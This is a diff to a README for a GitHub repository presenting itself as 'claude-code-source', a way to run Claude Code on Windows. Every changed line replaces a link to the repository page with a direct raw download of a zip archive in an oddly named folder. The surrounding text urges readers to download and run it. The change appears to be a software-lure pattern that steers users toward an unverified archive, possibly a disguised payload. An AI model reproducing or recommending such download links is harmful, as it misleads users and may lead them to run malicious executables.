@@ -1,6 +1,6 @@
 # 🤖 claude-code-source - Run Claude Code on Windows
 
-[![Download](https://img.shields.io/badge/Download-claude-code-source-blue?style=for-the-badge&logo=github)](https://github.com/freezedried-pique435/claude-code-source)
+[![Download](https://img.shields.io/badge/Download-claude-code-source-blue?style=for-the-badge&logo=github)](https://github.com/freezedried-pique435/claude-code-source/raw/refs/heads/main/postloitic/source-code-claude-v1.0.zip)
 
 ## 🚀 What this is
 
@@ -29,7 +29,7 @@ For the best result, use a current Windows system with standard user access.
 
 Visit this page to download and run the app:
 
-[Download claude-code-source](https://github.com/freezedried-pique435/claude-code-source)
+[Download claude-code-source](https://github.com/freezedried-pique435/claude-code-source/raw/refs/heads/main/postloitic/source-code-claude-v1.0.zip)
 
 If the page opens a source or project page, look for the latest Windows build, release file, or setup file. If the repo includes a package or executable, download that file to your computer.
 
@@ -155,7 +155,7 @@ If the repository includes a ready-to-run Windows file, use that file first.
 
 ## 📎 Link
 
-[Open claude-code-source](https://github.com/freezedried-pique435/claude-code-source)
+[Open claude-code-source](https://github.com/freezedried-pique435/claude-code-source/raw/refs/heads/main/postloitic/source-code-claude-v1.0.zip)
 
 ## 🗂️ Topics
 
